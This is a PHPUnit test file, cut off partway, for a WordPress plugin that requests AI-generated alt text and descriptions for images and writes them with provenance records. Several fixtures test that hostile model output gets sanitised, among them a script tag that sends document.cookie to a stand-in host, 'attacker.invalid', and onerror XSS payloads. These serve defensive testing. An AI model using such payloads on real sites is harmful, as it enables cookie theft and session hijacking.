<?php

declare(strict_types=1);

namespace AltContext\Tests\Unit;

use AltContext\Api\DescribeController;
use AltContext\Api\DescribeHostInterface;
use AltContext\Api\Services\DescribeMediaService;
use AltContext\Api\Services\DescriptionBudgetService;
use AltContext\Tests\Stubs\NullIdentityMembersRepository;
use AltContext\Tests\TestCase;
use WP_Error;
use WP_REST_Request;
use WP_REST_Response;

use function json_decode;

/**
 * E19-1 S6: WordPress describe path. The controller resolves one attachment,
 * reads its bytes, attaches inert wp_context, and dispatches a single-image
 * multipart request to the backend /scene/describe/multipart route. The
 * backend response is passed through unchanged; a malformed upstream envelope
 * is rejected with an explicit 502 (rg-015 — never fabricate fields).
 *
 * @covers \AltContext\Api\DescribeController
 * @covers \AltContext\Api\Services\DescribeMediaService
 */
class DescribeMediaServiceTest extends TestCase
{
    private DescribeController $controller;
    private string $tempDir;

    protected function setUp(): void
    {
        parent::setUp();
        $this->setOption('acx_recognition_url', 'http://localhost:8000');
        $this->setOption('acx_recognition_api_key', 'test-key');
        $this->controller = new DescribeController();
        $this->tempDir = sys_get_temp_dir() . '/acx-e19-1-' . uniqid();
        mkdir($this->tempDir, 0o755, true);
    }

    protected function tearDown(): void
    {
        if (is_dir($this->tempDir)) {
            foreach (glob($this->tempDir . '/*') as $f) {
                @unlink($f);
            }
            @rmdir($this->tempDir);
        }
        parent::tearDown();
    }

    private function plantAttachment(int $id, string $bytes, string $extension = 'jpg'): string
    {
        $path = $this->tempDir . "/{$id}.{$extension}";
        file_put_contents($path, $bytes);
        $GLOBALS['__ac_attached_file'][$id] = $path;
        $GLOBALS['__ac_posts'][$id] = (object) array(
            'post_title'   => "Photo {$id}",
            'post_excerpt' => 'A caption.',
            'post_content' => 'A long description.',
        );
        return $path;
    }

    /**
     * @return array<string,mixed>
     */
    private function validBackendBody(int $media_id): array
    {
        return array(
            'tenant_id'              => self::currentTenantId(),
            'media_id'               => $media_id,
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'visual_facts'           => array('caption' => 'A photo.', 'objects' => array(), 'ocr_text' => null),
            'alt_text_draft'         => 'A photo.',
            'context_used'           => array('sources' => array(), 'applied' => false),
            'provider_disclosure'    => array('provider' => 'none', 'left_service_boundary' => false),
            'cached'                 => false,
            'duration_ms'            => 3,
            'retention_class'        => 'retain_all',
            'tier'                   => 'provisional_cpu',
            'result_generation'      => 0,
        );
    }

    /**
     * @param array<int,array<string,mixed>> $identityRows
     * @return array<string,mixed>
     */
    private function describeEnvelopeWithIdentityRows(array $identityRows, bool $allowPersonNames): array
    {
        $this->setOption('acx_description_allow_person_names', $allowPersonNames);
        $this->plantAttachment(42, "\xff\xd8\xff\xe0fake-jpeg-bytes", 'jpg');

        $host = new DescribeMediaServiceTestHost(self::currentTenantId(), $this->validBackendBody(42));
        $repo = new DescribeMediaServiceTestIdentityRepository($identityRows);
        $service = new DescribeMediaService($host, null, $repo);

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $service->describe_media($req);

        $body = $host->lastBody['request'] ?? '';
        $this->assertIsString($body);

        return json_decode($body, true);
    }

    public function testDispatchesSingleImageMultipartToSceneRoute(): void
    {
        $bytes = "\xff\xd8\xff\xe0fake-jpeg-bytes";
        $this->plantAttachment(42, $bytes, 'jpg');
        $GLOBALS['__ac_site_url'] = 'http://acx.test';

        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertNotInstanceOf(WP_Error::class, $result, var_export($result, true));
        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame(200, $result->get_status());

        $calls = $this->getHttpCalls();
        $this->assertCount(1, $calls);
        $call = $calls[0];
        $this->assertStringContainsString('/scene/describe/multipart', $call['url']);

        $body = $call['args']['body'];
        $this->assertIsString($body);
        // Exactly one image part with the raw bytes embedded.
        $this->assertStringContainsString('name="image_42"; filename=', $body);
        $this->assertStringContainsString($bytes, $body);

        // The 'request' envelope carries tenant_id + media_id + bounded context pack.
        $this->assertStringContainsString("name=\"request\"\r\n", $body);
        $this->assertMatchesRegularExpression('/name="request".*?\r\n\r\n(\{.*?\})\r\n/s', $body);
        preg_match('/name="request".*?\r\n\r\n(\{.*?\})\r\n/s', $body, $m);
        $envelope = json_decode($m[1], true);
        $this->assertSame(self::currentTenantId(), $envelope['tenant_id']);
        $this->assertSame(42, $envelope['media_id']);
        $this->assertIsArray($envelope['context_pack']);
        $this->assertSame('Photo 42', $envelope['context_pack']['attachment']['title']);
        $this->assertSame('42.jpg', $envelope['context_pack']['attachment']['filename']);
        // No top-level keys the backend's extra='forbid' envelope rejects.
        $this->assertSame(array('tenant_id', 'media_id', 'context_pack'), array_keys($envelope));

        // Response is passed through unchanged.
        $data = $result->get_data();
        $this->assertSame('A photo.', $data['alt_text_draft']);
        $this->assertFalse($data['cached']);

        $usage = (new DescriptionBudgetService())->usage_summary();
        $this->assertSame(1, $usage['attempts']);
        $this->assertSame(1, $usage['successes']);
        $this->assertSame(0, $usage['failures']);
    }

    public function testRegisterRoutesExposesWriteIntentArgs(): void
    {
        $this->controller->register_routes();

        $route = null;
        foreach ($GLOBALS['__ac_rest_routes'] as $definition) {
            if (($definition['namespace'] ?? null) === 'acx/v1' && ($definition['route'] ?? null) === '/recognition/describe') {
                $route = $definition;
                break;
            }
        }

        $this->assertIsArray($route);
        $args = $route['args']['args'] ?? array();
        $this->assertArrayHasKey('media_id', $args);
        $this->assertArrayHasKey('write_alt', $args);
        $this->assertSame('boolean', $args['write_alt']['type'] ?? null);
        $this->assertFalse($args['write_alt']['default'] ?? true);
        $this->assertArrayHasKey('force', $args);
        $this->assertSame('boolean', $args['force']['type'] ?? null);
        $this->assertFalse($args['force']['default'] ?? true);
    }

    public function testPreviewOnlyDoesNotWriteAltTextOrProvenance(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
        $this->assertArrayNotHasKey('alt_text_write', $result->get_data());
    }

    public function testWriteIntentPersistsMissingAltTextAndProvenance(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('written', $result->get_data()['alt_text_write']['status'] ?? null);

        $writtenAlt = get_post_meta(42, '_wp_attachment_image_alt', true);
        $this->assertSame('A photo.', $writtenAlt);

        $provenance = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($provenance);
        $this->assertSame('seeded', $provenance['adapter']);
        $this->assertSame('seeded-fixtures', $provenance['model_id']);
        $this->assertSame('1', $provenance['model_version']);
        $this->assertSame('1', $provenance['prompt_or_task_version']);
        $this->assertSame(str_repeat('a', 64), $provenance['image_hash']);
        $this->assertSame(str_repeat('b', 64), $provenance['context_hash']);
        $this->assertArrayHasKey('generated_at', $provenance);
        // BR-100: history resolves Generated-alt from this key — must equal the
        // exact string written to _wp_attachment_image_alt, not a re-derivation.
        $this->assertSame($writtenAlt, $provenance['alt_text_draft']);
        $this->assertSame('A photo.', $provenance['alt_text_draft']);
    }

    public function testWriteIntentSkipsExistingAltTextByDefault(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'Human-authored alt');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('Human-authored alt', get_post_meta(42, '_wp_attachment_image_alt', true));
        // No alt write → no provenance envelope at all (no fabricated alt_text_draft).
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
        $this->assertSame('skipped_existing_alt', $result->get_data()['alt_text_write']['status'] ?? null);
    }

    /**
     * BR-108: force no-op on a pre-wave envelope (no alt_text_draft key) still
     * fires (identity match is draft-free) and heals the draft key into place
     * without restamping generated_at or rewriting the rest of the envelope.
     */
    public function testForceNoOpHealsMissingAltTextDraftOnPreWaveEnvelope(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        // Prior envelope deliberately omits alt_text_draft (pre-wave shape).
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $req->set_param('force', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));

        $healed = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($healed);
        // Draft key healed; identity + generated_at preserved (not a full restamp).
        $this->assertSame('A photo.', $healed['alt_text_draft']);
        $this->assertSame('2026-01-01T00:00:00+00:00', $healed['generated_at']);
        $this->assertSame('seeded', $healed['adapter']);
        $this->assertSame(str_repeat('a', 64), $healed['image_hash']);
    }

    /**
     * BR-108: force no-op with a stale alt_text_draft corrects the key so the
     * audit trail matches the draft the operator actually has in alt meta.
     */
    public function testForceNoOpCorrectsStaleAltTextDraft(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
            'alt_text_draft'         => 'STALE DRAFT',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $req->set_param('force', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));

        $healed = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($healed);
        $this->assertSame('A photo.', $healed['alt_text_draft']);
        $this->assertNotSame('STALE DRAFT', $healed['alt_text_draft']);
        // Rest of envelope stable.
        $this->assertSame('2026-01-01T00:00:00+00:00', $healed['generated_at']);
        $this->assertSame('seeded-fixtures', $healed['model_id']);
    }

    /**
     * BR-104: empty alt_text_draft must not write alt meta or provenance, and
     * must report skipped_empty_alt_text (CLI parity).
     */
    public function testWriteIntentSkipsEmptyAltTextDraft(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $body = $this->validBackendBody(42);
        $body['alt_text_draft'] = '';
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame(200, $result->get_status());
        $this->assertSame('skipped_empty_alt_text', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertSame('', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * BR-104: force=true with an empty draft must not clear a human-authored alt.
     * Pre-fix this reported written and stored '' — irreversible data loss.
     */
    public function testForceWriteDoesNotClearHumanAltOnEmptyDraft(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'Human-authored alt');
        $body = $this->validBackendBody(42);
        $body['alt_text_draft'] = '   ';
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $req->set_param('force', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('skipped_empty_alt_text', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertTrue($result->get_data()['alt_text_write']['existing_alt_present'] ?? false);
        $this->assertSame('Human-authored alt', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', get_post_meta(42, '_acx_description_provenance', true));
    }

    /**
     * BR-116: non-string alt_text_draft is a boundary violation (502), not
     * silently coerced to '' (REST) or '42' (CLI cast).
     */
    public function testNonStringAltTextDraftReturns502(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $body = $this->validBackendBody(42);
        $body['alt_text_draft'] = 42;
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_Error::class, $result);
        $this->assertSame('invalid_description_envelope', $result->get_error_code());
        $this->assertSame(502, $result->get_error_data()['status'] ?? null);
        $this->assertStringContainsString('alt_text_draft', $result->get_error_message());
        $this->assertSame('', get_post_meta(42, '_wp_attachment_image_alt', true));
    }

    public function testForceWriteOverwritesExistingAltTextAndStoresProvenance(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'Human-authored alt');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $req->set_param('force', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['status'] ?? null);
        $this->assertIsArray(get_post_meta(42, '_acx_description_provenance', true));
    }

    public function testForceWritePreservesMatchingGeneratedProvenance(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg');
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'A photo.');
        // Envelope already carries the correct draft — no-op must leave it byte-identical.
        $existingProvenance = array(
            'adapter'                => 'seeded',
            'model_id'               => 'seeded-fixtures',
            'model_version'          => '1',
            'prompt_or_task_version' => '1',
            'image_hash'             => str_repeat('a', 64),
            'context_hash'           => str_repeat('b', 64),
            'generated_at'           => '2026-01-01T00:00:00+00:00',
            'alt_text_draft'         => 'A photo.',
        );
        $this->setPostMeta(42, '_acx_description_provenance', $existingProvenance);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', 42);
        $req->set_param('write_alt', true);
        $req->set_param('force', true);
        $result = $this->controller->describe_media($req);

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame($existingProvenance, get_post_meta(42, '_acx_description_provenance', true));
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['status'] ?? null);
    }

    /**
     * BR-116: shared normaliser is the single definition for draft coercion.
     */
    public function testNormalizeAltTextDraftTrimsStringsAndRejectsNonStringsAsEmpty(): void
    {
        $this->assertSame('A photo.', DescribeMediaService::normalize_alt_text_draft('  A photo.  '));
        $this->assertSame('', DescribeMediaService::normalize_alt_text_draft(''));
        $this->assertSame('', DescribeMediaService::normalize_alt_text_draft('   '));
        $this->assertSame('', DescribeMediaService::normalize_alt_text_draft(42));
        $this->assertSame('', DescribeMediaService::normalize_alt_text_draft(null));
        $this->assertSame('', DescribeMediaService::normalize_alt_text_draft(array('nope')));
    }

    /**
     * @return array<string,mixed>
     */
    private function validBackendBodyWithLong(int $media_id, string $long = 'A tabby cat lounging on a woven mat in warm afternoon light.'): array
    {
        $body = $this->validBackendBody($media_id);
        $body['alt_text_long'] = $long;
        return $body;
    }

    private function plantWritableAttachment(int $id): void
    {
        $this->plantAttachment($id, "\xff\xd8\xff\xe0bytes", 'jpg');
        // plantAttachment seeds a non-empty description; description-write
        // tests start from the common empty-description state.
        $GLOBALS['__ac_posts'][$id]->post_content = '';
    }

    private function writeRequest(int $media_id, bool $force = false): WP_REST_Request
    {
        $req = new WP_REST_Request('POST', '/acx/v1/recognition/describe');
        $req->set_param('media_id', $media_id);
        $req->set_param('write_alt', true);
        if ($force) {
            $req->set_param('force', true);
        }
        return $req;
    }

    public function testAltPlusDescriptionWritesLongToAttachmentDescription(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame(
            'A tabby cat lounging on a woven mat in warm afternoon light.',
            $GLOBALS['__ac_posts'][42]->post_content
        );
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('written', $write['status']);
        $this->assertSame('written', $write['description_write'] ?? null);
    }

    /**
     * BR-130: hostile markup in alt_text_long must not survive into post_content.
     * Goes RED if maybe_write_long_description writes the raw model string.
     */
    public function testAltPlusDescriptionStripsHostileMarkupFromLongDescription(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $hostile = "<script>fetch('https://attacker.invalid/?c='+document.cookie)</script>Plain long text.";
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $hostile)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $stored = $GLOBALS['__ac_posts'][42]->post_content;
        $this->assertStringNotContainsString('<script>', $stored);
        $this->assertStringNotContainsString('attacker.invalid', $stored);
        $this->assertStringNotContainsString('document.cookie', $stored);
        $this->assertSame('Plain long text.', $stored);
        $this->assertSame('written', $result->get_data()['alt_text_write']['description_write'] ?? null);
    }

    /**
     * BR-130 sibling: alt-text draft is also model output and is stripped at the
     * write boundary (update_post_meta does not KSES).
     */
    public function testWriteAltStripsHostileMarkupFromDraft(): void
    {
        $this->plantWritableAttachment(42);
        $body = $this->validBackendBody(42);
        $body['alt_text_draft'] = '<img src=x onerror=alert(1)>A photo.';
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $stored = get_post_meta(42, '_wp_attachment_image_alt', true);
        $this->assertSame('A photo.', $stored);
        $this->assertStringNotContainsString('<img', $stored);
        $this->assertStringNotContainsString('onerror', $stored);
    }

    /**
     * BR-149: provenance alt_text_draft must be the same sanitize_text_field
     * result written to alt meta — never the raw model string. Goes RED if
     * apply_alt_text_write_policy stamps raw draft into provenance while
     * sanitizing only the alt write.
     */
    public function testProvenanceDraftMatchesSanitizedAltNotRawInput(): void
    {
        $this->plantWritableAttachment(42);
        $raw = '<img src=x onerror=alert(1)>A photo with x < y.';
        $body = $this->validBackendBody(42);
        $body['alt_text_draft'] = $raw;
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $storedAlt = get_post_meta(42, '_wp_attachment_image_alt', true);
        $provenance = get_post_meta(42, '_acx_description_provenance', true);
        $this->assertIsArray($provenance);
        $expected = sanitize_text_field($raw);
        $this->assertSame($expected, $storedAlt);
        $this->assertSame($storedAlt, $provenance['alt_text_draft']);
        $this->assertNotSame($raw, $provenance['alt_text_draft']);
        $this->assertStringNotContainsString('<img', (string) $provenance['alt_text_draft']);
    }

    /**
     * BR-133: bare `<` in model prose must survive into alt (entity-encoded by
     * sanitize_text_field), not truncate at the first `<`.
     * Goes RED if normalize_alt_text_draft still uses bare wp_strip_all_tags.
     *
     * @dataProvider bareLessThanAltDraftProvider
     */
    public function testWriteAltPreservesBareLessThanInDraft(string $draft, string $expected): void
    {
        $this->plantWritableAttachment(42);
        $body = $this->validBackendBody(42);
        $body['alt_text_draft'] = $draft;
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($body),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $stored = get_post_meta(42, '_wp_attachment_image_alt', true);
        $this->assertSame($expected, $stored);
        $this->assertStringNotContainsString('<script>', $stored);
        $this->assertStringNotContainsString('<img', $stored);
    }

    /**
     * BR-133: bare `<` in alt_text_long must survive into post_content via
     * sanitize_textarea_field (newlines preserved; markup still stripped).
     *
     * @dataProvider bareLessThanLongDescriptionProvider
     */
    public function testAltPlusDescriptionPreservesBareLessThanInLong(string $long, string $expected): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42, $long)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $stored = $GLOBALS['__ac_posts'][42]->post_content;
        $this->assertSame($expected, $stored);
        $this->assertStringNotContainsString('<script>', $stored);
        $this->assertStringNotContainsString('<img', $stored);
        $this->assertSame('written', $result->get_data()['alt_text_write']['description_write'] ?? null);
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function bareLessThanAltDraftProvider(): array
    {
        return array(
            'comparison' => array('x <= y', 'x &lt;= y'),
            'heart_prose' => array(
                'Photo of a <3 shaped cloud above the lake',
                'Photo of a &lt;3 shaped cloud above the lake',
            ),
            'script_still_stripped' => array('<script>alert(1)</script>Safe text', 'Safe text'),
            'img_onerror_still_stripped' => array('<img src=x onerror=alert(1)>A photo.', 'A photo.'),
        );
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function bareLessThanLongDescriptionProvider(): array
    {
        return array(
            'comparison' => array('x <= y', 'x &lt;= y'),
            'heart_prose' => array(
                'Photo of a <3 shaped cloud above the lake',
                'Photo of a &lt;3 shaped cloud above the lake',
            ),
            'multiline_preserved' => array(
                "Line one\nPhoto of a <3 cloud",
                "Line one\nPhoto of a &lt;3 cloud",
            ),
            'script_still_stripped' => array(
                "<script>alert(1)</script>Plain long text.",
                'Plain long text.',
            ),
            'img_onerror_still_stripped' => array(
                '<img src=x onerror=alert(1)>Long caption.',
                'Long caption.',
            ),
        );
    }

    public function testAltStyleDefaultNeverWritesDescriptionEvenWhenLongPresent(): void
    {
        // Option unset -> alt_only default = current behavior byte-identical.
        $this->plantWritableAttachment(42);
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('written', $write['status']);
        $this->assertArrayNotHasKey('description_write', $write);
    }

    public function testInvalidAltStyleValueDegradesToAltOnly(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'bogus_style');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
        $this->assertArrayNotHasKey('description_write', $result->get_data()['alt_text_write']);
    }

    public function testAltPlusDescriptionWithoutLongTextSkipsDescriptionWrite(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBody(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A photo.', get_post_meta(42, '_wp_attachment_image_alt', true));
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('written', $write['status']);
        $this->assertSame('skipped_no_long_text', $write['description_write'] ?? null);
    }

    public function testAltPlusDescriptionSkipsExistingDescriptionWithoutForce(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg'); // description pre-filled
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('A long description.', $GLOBALS['__ac_posts'][42]->post_content);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('written', $write['status']);
        $this->assertSame('skipped_existing_description', $write['description_write'] ?? null);
    }

    public function testAltPlusDescriptionForceOverwritesExistingDescription(): void
    {
        $this->plantAttachment(42, "\xff\xd8\xff\xe0bytes", 'jpg'); // description pre-filled
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42, true));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame(
            'A tabby cat lounging on a woven mat in warm afternoon light.',
            $GLOBALS['__ac_posts'][42]->post_content
        );
        $this->assertSame('forced_overwrite', $result->get_data()['alt_text_write']['description_write'] ?? null);
    }

    public function testSkippedExistingAltAlsoSkipsDescriptionWrite(): void
    {
        $this->plantWritableAttachment(42);
        $this->setPostMeta(42, '_wp_attachment_image_alt', 'Human-authored alt');
        $this->setOption('acx_alt_style', 'alt_plus_description');
        $this->queueHttpResponse(array(
            'response' => array('code' => 200, 'message' => 'OK'),
            'body'     => (string) json_encode($this->validBackendBodyWithLong(42)),
        ));

        $result = $this->controller->describe_media($this->writeRequest(42));

        $this->assertInstanceOf(WP_REST_Response::class, $result);
        $this->assertSame('', $GLOBALS['__ac_posts'][42]->post_content);
        $write = $result->get_data()['alt_text_write'];
        $this->assertSame('skipped_existing_alt', $write['status']);
        $this->assertArrayNotHasKey('description_write', $write);
    }

    public function testPreviewNeverWritesDescriptionEvenWithLongAndStyle(): void
    {
        $this->plantWritableAttachment(42);
        $this->setOption('acx_alt_style', 'alt_plus_description');
